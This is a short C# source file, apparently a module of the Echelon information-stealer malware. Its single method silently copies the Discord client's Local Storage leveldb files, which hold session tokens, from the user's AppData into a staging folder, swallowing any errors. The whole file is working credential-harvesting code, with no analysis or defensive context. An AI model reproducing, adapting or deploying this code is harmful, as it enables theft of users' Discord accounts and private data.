

using System.IO;

namespace Echelon
{
    internal class Discord
    {
        public static int count;
        public static string dir = "\\discord\\Local Storage\\leveldb\\";

        public static void GetDiscord(string Echelon_Dir)  // Works
        {
            try
            {
                if (Directory.Exists(Help.AppDate + dir))
                {
                    foreach (var file in new DirectoryInfo(Help.AppDate + dir).GetFiles())
                    {
                        Directory.CreateDirectory(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\");
                        file.CopyTo(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\" + file.Name);
                    }
                    count++;
                }
            }
            catch  { }

        }
    }
}
